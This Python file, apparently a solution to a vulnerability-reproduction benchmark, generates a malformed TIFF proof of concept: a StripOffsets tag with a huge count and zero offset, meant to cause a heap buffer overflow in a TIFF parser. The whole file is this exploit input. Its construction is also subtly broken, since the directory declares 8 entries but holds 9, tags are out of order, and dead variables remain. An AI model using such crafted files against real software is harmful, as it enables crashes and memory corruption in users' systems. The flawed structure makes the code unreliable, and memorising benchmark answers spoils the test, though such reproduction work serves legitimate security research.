import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a TIFF file that triggers heap buffer overflow
        # Using little-endian byte order (II)
        
        # TIFF Header (8 bytes)
        # Byte order: II (little-endian)
        # Magic number: 42
        # Offset to first IFD: 8 (right after header)
        header = b'II\x2A\x00\x08\x00\x00\x00'
        
        # IFD structure
        # Number of directory entries: 1
        num_entries = 1
        
        # Create invalid offline tag with value offset 0
        # Tag: 273 (StripOffsets)
        # Type: LONG (4)
        # Count: Large value to cause overflow
        # Value offset: 0 (invalid)
        tag = 273
        type_code = 4  # LONG
        count = 0x100000  # Large count to trigger overflow
        value_offset = 0  # Invalid offset
        
        ifd_entry = struct.pack('<HHLL', tag, type_code, count, value_offset)
        
        # Offset to next IFD (0 = end)
        next_ifd = b'\x00\x00\x00\x00'
        
        # Assemble IFD
        ifd = struct.pack('<H', num_entries) + ifd_entry + next_ifd
        
        # Create minimal TIFF structure with required tags
        # ImageWidth (256)
        width_entry = struct.pack('<HHLL', 256, 3, 1, 100)
        # ImageLength (257)
        length_entry = struct.pack('<HHLL', 257, 3, 1, 100)
        # BitsPerSample (258)
        bits_entry = struct.pack('<HHLL', 258, 3, 1, 8)
        # Compression (259)
        comp_entry = struct.pack('<HHLL', 259, 3, 1, 1)
        # PhotometricInterpretation (262)
        photo_entry = struct.pack('<HHLL', 262, 3, 1, 1)
        # StripByteCounts (279)
        strip_counts_entry = struct.pack('<HHLL', 279, 4, 1, 0x100000)
        # SamplesPerPixel (277)
        samples_entry = struct.pack('<HHLL', 277, 3, 1, 1)
        # RowsPerStrip (278)
        rows_entry = struct.pack('<HHLL', 278, 3, 1, 100)
        
        # Create proper IFD with 8 entries
        num_proper_entries = 8
        proper_ifd = (struct.pack('<H', num_proper_entries) +
                     width_entry + length_entry + bits_entry + comp_entry +
                     photo_entry + strip_counts_entry + samples_entry +
                     rows_entry + ifd_entry + next_ifd)
        
        # Adjust header to point to proper IFD
        header = b'II\x2A\x00\x08\x00\x00\x00'
        
        # Assemble final TIFF
        # Header + proper IFD + padding to reach 162 bytes
        poc = header + proper_ifd
        
        # Pad to exactly 162 bytes as per ground truth
        current_len = len(poc)
        if current_len < 162:
            poc += b'\x00' * (162 - current_len)
        
        return poc[:162]